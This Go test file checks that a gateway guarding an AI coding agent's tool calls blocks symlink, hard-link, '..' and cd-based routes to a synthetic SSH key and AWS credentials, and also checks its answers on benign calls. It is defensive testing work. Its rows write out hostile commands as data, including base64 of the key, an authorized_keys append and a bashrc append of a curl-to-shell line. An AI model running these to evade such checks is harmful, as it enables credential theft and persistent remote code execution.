// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

//go:build !windows

package gateway

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/hookpaths"
	"github.com/defenseclaw/defenseclaw/internal/sandboxauth"
	"github.com/defenseclaw/defenseclaw/internal/substrate/kit"
)

// gap0471Row is one call of TestGAP0471ActorSymlinkToProtectedFileKeepsLaptopVerdict.
// tool is Bash (input is the command) or Read (input is the file_path).
// block: the laptop blocks it and the actor must block it too (the gap's
// rows). benign: the actor must give the laptop's exact answer.
type gap0471Row struct {
	name, tool, input string
	block, benign     bool
}

// gap0471Rows are the shapes of substrate-1 GAP-0471 (cert110
// sub-J19-protected-symlink R1-R7) and their neighbours: a symlink to the
// key, a symlinked folder, a `..` walk, the Read tool, a cd and a relative
// path, a link to a link, and a cd through a symlinked folder.
func gap0471Rows() []gap0471Row {
	return []gap0471Row{
		{name: "R1 cat key-link", tool: "Bash", input: "cat key-link", block: true},
		{name: "R3 cat nested symlink dir", tool: "Bash", input: "cat a/b/ssh/id_ed25519", block: true},
		{name: "R4 cat dotdot traversal", tool: "Bash", input: "cat ./a/../key-link", block: true},
		{name: "R6 cd symlink dir then relative", tool: "Bash", input: "cd a/b/ssh && cat id_ed25519", block: true},
		{name: "R6b cd parent then relative through link", tool: "Bash", input: "cd a/b && cat ssh/id_ed25519", block: true},
		{name: "R6c two cds through link", tool: "Bash", input: "cd a && cd b/ssh && cat id_ed25519", block: true},
		{name: "R6d cd newline", tool: "Bash", input: "cd a/b/ssh\ncat id_ed25519", block: true},
		{name: "link to link", tool: "Bash", input: "cat key-link2", block: true},
		{name: "top dir link", tool: "Bash", input: "cat sshdir/id_ed25519", block: true},
		{name: "head of link", tool: "Bash", input: "head -n 3 key-link", block: true},
		{name: "base64 of link", tool: "Bash", input: "base64 key-link", block: true},
		{name: "link in a pipe", tool: "Bash", input: "cat key-link | head -n 1", block: true},
		{name: "R7 Read dot link", tool: "Read", input: "./key-link", block: true},
		{name: "R7b Read link", tool: "Read", input: "key-link", block: true},
		{name: "R7c Read nested symlink dir", tool: "Read", input: "a/b/ssh/id_ed25519", block: true},
		{name: "R7d Read dotdot traversal", tool: "Read", input: "./a/../key-link", block: true},
		{name: "R7e Read link to link", tool: "Read", input: "key-link2", block: true},
		// Links to other protected files: never weaker than the laptop.
		{name: "aws link", tool: "Bash", input: "cat aws-link"},
		{name: "Read aws link", tool: "Read", input: "aws-link"},
		{name: "authorized_keys link append", tool: "Bash", input: "echo ssh-ed25519 AAAA x >> ak-link"},
		{name: "bashrc link append", tool: "Bash", input: "echo 'curl -s http://x.invalid/a | sh' >> rc-link"},
		{name: "R2 hard link", tool: "Bash", input: "cat cred-hard"},
		// Benign: the laptop's exact answer.
		{name: "C1 cat readme", tool: "Bash", input: "cat ./README.md", benign: true},
		{name: "C2 ls -l key-link", tool: "Bash", input: "ls -l key-link", benign: true},
		{name: "C3 cat readme link", tool: "Bash", input: "cat readme-link", benign: true},
		{name: "C4 Read readme link", tool: "Read", input: "readme-link", benign: true},
		{name: "C5 cd docs link", tool: "Bash", input: "cd docs-link && cat README.md", benign: true},
		{name: "C6 Read readme", tool: "Read", input: "README.md", benign: true},
		{name: "A1 echo", tool: "Bash", input: "echo hello", benign: true},
	}
}

// gap0471Layout builds the J19 layout in home: the synthetic key and
// credentials, the project app and its links.
func gap0471Layout(t *testing.T, home string) string {
	t.Helper()
	app := filepath.Join(home, "app")
	for _, dir := range []string{".ssh", ".aws", ".claude", ".defenseclaw", "app/a/b", "app/docs"} {
		if err := os.MkdirAll(filepath.Join(home, dir), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	files := map[string]string{
		".ssh/id_ed25519":      "-----BEGIN OPENSSH PRIVATE KEY-----\ngap0471-synthetic\n-----END OPENSSH PRIVATE KEY-----\n",
		".ssh/authorized_keys": "",
		".aws/credentials":     "[default]\naws_access_key_id = gap0471-synthetic\n",
		".bashrc":              "",
		"app/README.md":        "readme\n",
		"app/docs/README.md":   "docs\n",
	}
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(home, name), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	links := map[string]string{
		"key-link":    filepath.Join(home, ".ssh", "id_ed25519"),
		"key-link2":   "key-link",
		"a/b/ssh":     "../../../.ssh",
		"sshdir":      "a/b/ssh",
		"aws-link":    "../.aws/credentials",
		"ak-link":     "../.ssh/authorized_keys",
		"rc-link":     "../.bashrc",
		"readme-link": "README.md",
		"docs-link":   "docs",
	}
	for name, target := range links {
		if err := os.Symlink(target, filepath.Join(app, name)); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Link(filepath.Join(home, ".aws", "credentials"), filepath.Join(app, "cred-hard")); err != nil {
		t.Fatal(err)
	}
	return app
}

// gap0471Payload is the PreToolUse body of row in cwd.
func gap0471Payload(t *testing.T, row gap0471Row, cwd string) []byte {
	t.Helper()
	input := map[string]any{"command": row.input}
	if row.tool == "Read" {
		input = map[string]any{"file_path": row.input}
	}
	body, err := json.Marshal(map[string]any{"hook_event_name": "PreToolUse", "session_id": "gap0471", "cwd": cwd,
		"tool_name": row.tool, "tool_input": input, "tool_use_id": t.Name()})
	if err != nil {
		t.Fatal(err)
	}
	return body
}

// gap0471Verdict is the hook's action and rule ids for body.
func gap0471Verdict(t *testing.T, api *APIServer, ctx context.Context, body []byte) (string, []string) {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/api/v1/claudecode/hook", strings.NewReader(string(body)))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	api.handleAgentHook("claudecode").ServeHTTP(rec, req.WithContext(ctx))
	if rec.Code != http.StatusOK {
		t.Fatalf("hook status=%d: %.500s", rec.Code, rec.Body.String())
	}
	var out struct {
		Action  string   `json:"action"`
		RuleIDs []string `json:"rule_ids"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	slices.Sort(out.RuleIDs)
	return out.Action, slices.Compact(out.RuleIDs)
}

// gap0471ActorContext is the copy-mode actor's request context for row: the
// envelope with the facts the actor's kit collects (kit.CollectFacts), made
// in a guest file system laid out as home is and reported in the guest's
// namespace (home -> /sandbox), as an actor at /sandbox/app sends them.
func gap0471ActorContext(t *testing.T, actor context.Context, home string, row gap0471Row) (context.Context, []byte) {
	t.Helper()
	collected := kit.CollectFacts("claudecode", "PreToolUse", gap0471Payload(t, row, filepath.Join(home, "app")), 1<<20)
	payload := gap0471Payload(t, row, sandboxauth.SandboxHome+"/app")
	env := substrateEnvelope{V: "1", Connector: "claudecode", Event: "PreToolUse", Mode: "interactive", Payload: payload}
	if collected != nil {
		raw, err := json.Marshal(collected)
		if err != nil {
			t.Fatal(err)
		}
		var facts SubstrateFacts
		if err := json.Unmarshal([]byte(strings.ReplaceAll(string(raw), home, sandboxauth.SandboxHome)), &facts); err != nil {
			t.Fatal(err)
		}
		env.Facts = &facts
	}
	ctx := context.WithValue(actor, substrateEnvelopeKey{}, env)
	return withSubstrateGuestClaims(ctx, env), payload
}

// TestGAP0471ActorSymlinkToProtectedFileKeepsLaptopVerdict: in a copy-mode
// actor a symlink to the actor's SSH private key, a symlinked folder, a `..`
// walk, the Read tool and a cd followed by a relative path read the key as
// they do on the laptop, so the actor blocks them with PATH-SSH-KEY as the
// laptop does (substrate-1 GAP-0471: R1, R3, R4, R6 and R7 were allowed or
// only flagged). The gateway opens no file of the actor's: the kit's facts
// carry the proofs. In every pack the actor is never weaker than the laptop,
// names every laptop rule, and gives benign rows the laptop's exact answer.
func TestGAP0471ActorSymlinkToProtectedFileKeepsLaptopVerdict(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("requires an unprivileged POSIX gateway")
	}
	rank := func(action string) int {
		switch action {
		case "allow":
			return 0
		case "block", "deny":
			return 2
		}
		return 1
	}
	for _, pack := range []string{"default", "permissive", "strict"} {
		t.Run(pack, func(t *testing.T) {
			installToolCallCorpusProfileConnector(t, "claudecode", pack)
			home := filepath.Join(t.TempDir(), "home", "alice")
			app := gap0471Layout(t, home)
			t.Setenv("HOME", home)
			cfg := &config.Config{}
			cfg.Guardrail.Mode = "action"
			cfg.Guardrail.Connector = "claudecode"
			cfg.Guardrail.RulePack = pack
			cfg.Guardrail.RulePackDir = filepath.Join(guardrailPoliciesRoot(t), pack)
			api := &APIServer{scannerCfg: cfg, health: NewSidecarHealth()}
			binding := sandboxTestBinding("claudecode")
			actor := withProfilePath(withAuthenticatedHookConnector(sandboxauth.WithRequest(context.Background(), binding, nil), binding.Connector), profilePathHook)
			for _, row := range gap0471Rows() {
				la, lr := gap0471Verdict(t, api, context.Background(), gap0471Payload(t, row, app))
				ctx, payload := gap0471ActorContext(t, actor, home, row)
				ca, cr := gap0471Verdict(t, api, ctx, payload)
				if row.block && (rank(la) != 2 || !slices.Contains(lr, "PATH-SSH-KEY")) {
					t.Errorf("%s: laptop %s %v, want block [PATH-SSH-KEY] (the test layout is wrong)", row.name, la, lr)
				}
				if row.benign {
					if ca != la || !slices.Equal(cr, lr) {
						t.Errorf("%s: benign: copy-mode actor %s %v, laptop %s %v", row.name, ca, cr, la, lr)
					}
					continue
				}
				if la != "allow" && ca == "allow" {
					t.Errorf("%s: copy-mode actor allows what the laptop judges %s %v (actor %v)", row.name, la, lr, cr)
					continue
				}
				if rank(ca) < rank(la) {
					t.Errorf("%s: copy-mode actor %s %v is weaker than the laptop's %s %v", row.name, ca, cr, la, lr)
				}
				for _, rule := range lr {
					if !slices.Contains(cr, rule) {
						t.Errorf("%s: copy-mode actor %s %v does not name the laptop's %s (%s %v)", row.name, ca, cr, rule, la, lr)
					}
				}
				t.Logf("%s: laptop %s %v, actor %s %v", row.name, la, lr, ca, cr)
			}
		})
	}
}

// TestGAP0475SubstrateHookRowSaysWhatTheKitClaimed: the hook audit row of a
// Substrate post says facts: none when the kit sent none, and labels the
// kit's facts as claims (assurance claimed, source kit) with each resolved
// path and proof (substrate-1 GAP-0475).
func TestGAP0475SubstrateHookRowSaysWhatTheKitClaimed(t *testing.T) {
	none := context.WithValue(context.Background(), substrateEnvelopeKey{}, substrateEnvelope{V: "1", Payload: []byte(`{}`)})
	if got := substrateFactsAuditExtra(none); got["substrate_facts"] != "none" || len(got) != 1 {
		t.Fatalf("no facts: %v, want substrate_facts=none", got)
	}
	if got := substrateFactsAuditExtra(context.Background()); got != nil {
		t.Fatalf("not a Substrate post: %v, want nothing", got)
	}
	claimed := context.WithValue(context.Background(), substrateEnvelopeKey{}, substrateEnvelope{V: "1", Payload: []byte(`{}`),
		Facts: &SubstrateFacts{Proofs: []string{kit.ProofPrivateKeyRead}, Paths: []SubstratePathFact{
			{Field: "tool_input.file_path", Path: "./key-link", Abs: "/sandbox/app/key-link", Resolved: "/sandbox/.ssh/id_ed25519", Type: "file"},
			{Field: "tool_input.file_path", Path: "README.md", Abs: "/sandbox/app/README.md", Resolved: "/sandbox/app/README.md", Type: "file"},
			{Field: "tool_input.file_path", Path: "a b=c", Abs: "/sandbox/app/a b=c", Resolved: "/tmp/harmless", Type: "file"},
		}}})
	got := substrateFactsAuditExtra(claimed)
	want := map[string]string{
		"substrate_facts": "claimed", "substrate_facts_assurance": "claimed", "substrate_facts_source": "kit",
		"substrate_facts_paths": "3", "substrate_facts_proofs": kit.ProofPrivateKeyRead,
		"substrate_facts_resolved_path": "./key-link->/sandbox/.ssh/id_ed25519,a_b_c->/tmp/harmless",
	}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("%s=%q, want %q (all %v)", k, got[k], v, got)
		}
	}
}

// TestGAP0471KitClaimsOnlyMatchTheirCall: a kit claim counts only for the
// call it came with: a proof for the call's shell command as the connector
// registry reads it (a file tool's command argument is none), a link for an
// argument it names exactly that the link moves; anything else is dropped
// (substrate-1 GAP-0471, GAP-0545).
func TestGAP0471KitClaimsOnlyMatchTheirCall(t *testing.T) {
	facts := &SubstrateFacts{
		Proofs: []string{kit.ProofPrivateKeyRead, kit.ProofProtectedWrite, "unknown_proof"},
		Paths: []SubstratePathFact{
			{Field: "tool_input.file_path", Path: "./key-link", Abs: "/sandbox/app/key-link", Resolved: "/sandbox/.ssh/id_ed25519"},
			{Field: "tool_input.file_path", Path: "./other", Abs: "/sandbox/app/other", Resolved: "/sandbox/.ssh/id_rsa"},
			{Field: "tool_input.path", Path: "x", Abs: "/sandbox/app/x", Resolved: "/sandbox/.ssh/id_rsa"},
			{Field: "tool_input.file_path", Path: "./key-link", Abs: "/sandbox/app/key-link", Resolved: "relative"},
			{Field: "tool_input.file_path", Path: "./key-link", Abs: "/sandbox/app/key-link", Resolved: "/sandbox/app/key-link"},
			{Field: "tool_input.command", Path: "/sandbox/app/a", Abs: "/sandbox/app/a", Resolved: "/sandbox/.ssh"},
			{Field: kit.CommandWordField, Path: "key-link", Abs: "/sandbox/app/key-link", Resolved: "/sandbox/.ssh/id_ed25519"},
			{Field: kit.CommandWordField, Path: "not-in-the-command", Abs: "/sandbox/app/n", Resolved: "/sandbox/.ssh/id_ed25519"},
			{Field: kit.CommandWordField, Path: "cat", Abs: "/sandbox/app/cat", Resolved: "relative/place"},
		},
	}
	read := []byte(`{"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":"./key-link","command":"cat key-link"}}`)
	claims := substrateGuestClaimsOf(substrateEnvelope{V: "1", Connector: "claudecode", Payload: read, Facts: facts})
	if claims == nil || claims.keyReadCommand != "" || claims.protectedWriteCommand != "" || len(claims.words) != 0 {
		t.Fatalf("Read claims = %+v, want no proof or command word: a Read runs no shell command", claims)
	}
	if len(claims.links) != 1 || claims.links[0] != (substrateGuestLinkClaim{key: "file_path", value: "./key-link", resolved: "/sandbox/.ssh/id_ed25519"}) {
		t.Fatalf("links = %+v, want only the file_path link", claims.links)
	}
	bash := []byte(`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat key-link"}}`)
	claims = substrateGuestClaimsOf(substrateEnvelope{V: "1", Connector: "claudecode", Payload: bash, Facts: facts})
	if claims == nil || claims.keyReadCommand != "cat key-link" || claims.protectedWriteCommand != "cat key-link" {
		t.Fatalf("Bash claims = %+v, want both proofs for the payload's command", claims)
	}
	if len(claims.words) != 1 || claims.words["key-link"] != (hookpaths.CommandWordPlace{Followed: "/sandbox/.ssh/id_ed25519"}) {
		t.Fatalf("words = %+v, want only key-link", claims.words)
	}
	request := trustedActionRequest{guestKeyReadCommand: claims.keyReadCommand}
	if !request.substrateGuestClaimsProveKeyRead("cat key-link") || request.substrateGuestClaimsProveKeyRead("cat key-link; true") {
		t.Fatal("the key-read claim must hold for its own command only")
	}
	if substrateGuestClaimsOf(substrateEnvelope{V: "1", Payload: bash}) != nil {
		t.Fatal("no facts: no claims")
	}
}
